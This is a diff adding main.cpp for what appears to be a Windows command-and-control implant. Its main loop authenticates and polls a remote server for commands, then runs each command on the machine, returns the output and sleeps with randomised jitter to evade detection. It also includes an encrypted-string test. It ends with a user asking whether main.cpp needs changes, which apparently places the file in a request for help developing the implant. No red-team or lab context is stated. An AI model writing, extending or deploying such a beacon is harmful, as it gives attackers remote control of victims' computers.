@@ -1,0 +1,92 @@
+// main.cpp
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+#include <winsock2.h>
+#include <windows.h>
+#include <iostream>
+#include <sstream>
+#include <vector>
+#include <string>
+#include <random>
+#include <thread>
+#include <chrono>
+#include <map>
+#include "client.h"
+#include "encryption.h"
+#include "mac_uuid.h"
+
+#pragma comment(lib, "Ws2_32.lib")  
+
+#define DEFAULT_SLEEP_DELAY 10
+int currentSleepDelay = DEFAULT_SLEEP_DELAY;
+int currentSleepJitter = 0;
+
+int get_jittered_sleep(int base, int jitterPercent) {
+    if (base <= 0) return 0;
+    int maxJitter = (base * jitterPercent) / 100;
+    std::random_device rd;
+    std::mt19937 gen(rd());
+    std::uniform_int_distribution<> dist(-maxJitter, maxJitter);
+    int jitter = dist(gen);
+    int finalSleep = base + jitter;
+    return (finalSleep < 0) ? 0 : finalSleep;
+}
+
+int main() {
+    try {
+        std::string decrypted = DecryptMessage(
+            "OqpPfcAZEWoVK8mzBpTKl7/Uxa7+X+BhohTa0B1Zq4tNyuHLXKZ+k3CvY6Rf1MYn"
+        );
+        std::cout << "[AES TEST] Decrypted: " << decrypted << "\n";
+    }
+    catch (const std::exception& ex) {
+        std::cerr << "[AES TEST] Error: " << ex.what() << "\n";
+    }
+
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        std::cerr << "WSAStartup failed.\n";
+        return -1;
+    }
+
+    if (verify_auth() != 0) {
+        std::cerr << "Authentication failed.\n";
+        WSACleanup();
+        return -1;
+    }
+
+    while (true) {
+        std::vector<std::string> commands;
+        if (query_commands(commands) == 0) {
+            if (commands.empty()) {
+                std::cout << "No commands received.\n";
+            }
+            else {
+                std::vector<std::pair<std::string, std::string>> results;
+                for (const auto& cmd : commands) {
+                    std::string output = execute_command(cmd);
+                    std::string escapedOutput = json_escape(output);
+
+                    results.emplace_back(cmd, escapedOutput);
+                }
+
+                if (send_command_result(results) != 0) {
+                    std::cerr << "Failed to send command results.\n";
+                }
+            }
+        }
+        else {
+            std::cerr << "Failed to query commands.\n";
+        }
+
+        int delay = get_jittered_sleep(currentSleepDelay, currentSleepJitter);
+        std::cout << "[INFO] Sleeping for " << delay
+            << " seconds (delay=" << currentSleepDelay
+            << ", jitter=" << currentSleepJitter << "%)\n";
+        Sleep(delay * 1000);
+    }
+
+    WSACleanup();
+    return 0;
+}
+
+so, no need to update anything in main.cpp code?
